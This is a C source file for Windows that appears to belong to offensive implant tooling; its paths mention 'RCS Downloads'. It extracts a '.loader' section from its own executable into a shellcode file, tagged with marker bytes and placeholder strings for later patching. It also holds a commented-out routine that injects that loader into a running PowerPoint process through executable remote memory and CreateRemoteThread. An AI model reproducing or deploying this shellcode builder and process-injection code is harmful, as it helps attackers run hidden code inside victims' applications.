#include <Windows.h>
#include <stdio.h>
#include "Updater.h"

int main()
{
	DWORD dwOut;
	DWORD dwLoaderSize = (DWORD)END_UPDATER - (DWORD)Updater;

//	Startup();
	printf("%08x\n", Updater);
	LPSTR strSelfName = (LPSTR) malloc(0x1000);
	GetModuleFileName(GetModuleHandle(NULL), strSelfName, 0x1000);

	HANDLE hFile = CreateFile(strSelfName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		exit(printf("[!!] CreateFile: %08x\n", GetLastError()));

	DWORD dwFileSize = GetFileSize(hFile, NULL);
	LPBYTE lpBuffer = (LPBYTE) malloc(dwFileSize);
	if (!ReadFile(hFile, lpBuffer, dwFileSize, &dwOut, NULL))
		exit(printf("[!!] ReadFile: %08x\n", GetLastError()));
	CloseHandle(hFile);

	PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER) lpBuffer;
	PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS) (lpBuffer + pDosHdr->e_lfanew);
	PIMAGE_SECTION_HEADER pSectionHdr = (PIMAGE_SECTION_HEADER) (pNtHdrs + 1);
	for (UINT i=0; i<pNtHdrs->FileHeader.NumberOfSections; i++)
		if (!__STRCMPI__((LPSTR)pSectionHdr->Name, ".loader"))
			break;
		else
			pSectionHdr++;
#ifdef _WIN64
	hFile = CreateFile("c:\\users\\guido3\\desktop\\RCS Downloads\\shellcode64", GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, NULL, NULL);
#else
	hFile = CreateFile("c:\\users\\guido3\\desktop\\RCS Downloads\\shellcode", GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, NULL, NULL);
#endif
	if (hFile == INVALID_HANDLE_VALUE)
		exit(printf("[!!] CreateFile: %08x\n", GetLastError()));

	WriteFile(hFile, lpBuffer + pSectionHdr->PointerToRawData, pSectionHdr->SizeOfRawData, &dwOut, NULL);
	WriteFile(hFile, "\xca\xfe\xba\xbe", 4, &dwOut, NULL); // marker 1
	WriteFile(hFile, "SOLDIEROSOLDIEROSOLDIEROSOLDIERO", strlen("SOLDIEROSOLDIEROSOLDIEROSOLDIERO")+1, &dwOut, NULL);
	WriteFile(hFile, "\xfe\xfe\xfe\xfe", 4, &dwOut, NULL); // marker 2
	WriteFile(hFile, "SIZE", strlen("SIZE")+1, &dwOut, NULL);

	CloseHandle(hFile);

	return 0;
/*
	HANDLE hProcess = GetProcHandle("POWERPNT.exe", PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_READ|PROCESS_VM_WRITE|PROCESS_CREATE_THREAD);
	if (hProcess == INVALID_HANDLE_VALUE)
		return(printf("[W] No process found\n"));

 	LPVOID lpAddress = VirtualAllocEx(hProcess, NULL, dwLoaderSize + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpAddress == NULL)
		exit(printf("[!!] VirtualAllocEx: %08x\n", GetLastError()));

#ifdef _WIN64
	SIZE_T sOut;
	if (!WriteProcessMemory(hProcess, lpAddress, (LPVOID)LoaderEntryPoint, dwLoaderSize, &sOut))
#else
	if (!WriteProcessMemory(hProcess, lpAddress, (LPVOID)LoaderEntryPoint, dwLoaderSize, &dwOut))
#endif
		exit(printf("[!!] WriteProcessMemory: %08x\n", GetLastError()));

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) ((LPBYTE)lpAddress), NULL, 0, NULL);
	if (hThread == NULL)
		exit(printf("[!!] CreateRemoteThread: %08x\n", GetLastError()));

	WaitForSingleObject(hThread, INFINITE);
	printf("[*] done.\n");
	*/
}